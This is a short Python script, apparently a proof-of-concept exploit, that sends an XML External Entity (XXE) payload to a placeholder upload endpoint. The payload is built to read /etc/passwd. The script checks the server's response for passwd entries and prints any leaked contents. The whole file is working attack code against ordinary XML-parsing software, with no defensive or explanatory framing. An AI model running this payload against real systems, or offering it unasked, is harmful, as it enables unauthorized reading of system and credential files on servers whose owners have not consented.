import requests

# Configuration
TARGET_URL = 'http://vulnerable-website.com/upload_xml'

# XXE payload
XXE_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
'''

def upload_xml(url, xml_payload):
    """Send XML payload to the target URL."""
    try:
        response = requests.post(url, data=xml_payload, headers={'Content-Type': 'application/xml'})
        response.raise_for_status()  # Raise an HTTPError for bad responses
        return response
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def check_xxe_vulnerability(url):
    """Check for XXE vulnerability by inspecting the response for sensitive data."""
    response = upload_xml(url, XXE_PAYLOAD)
    if response is None:
        print("Error occurred during the request.")
        return False

    # Check for sensitive data in the response
    if "root:x:" in response.text or "bin:x:" in response.text:  # Example of Unix passwd file entries
        print("XXE vulnerability found. Sensitive data exposed:")
        print(response.text)
        return True
    return False

def perform_xxe_attack():
    """Perform XXE attack and verify vulnerability."""
    if check_xxe_vulnerability(TARGET_URL):
        print("XXE vulnerability confirmed. Exploiting...")
        # You can add more sophisticated exploitation or logging here
        print("XXE attack executed.")
    else:
        print("No XXE vulnerability found.")

if __name__ == "__main__":
    perform_xxe_attack()
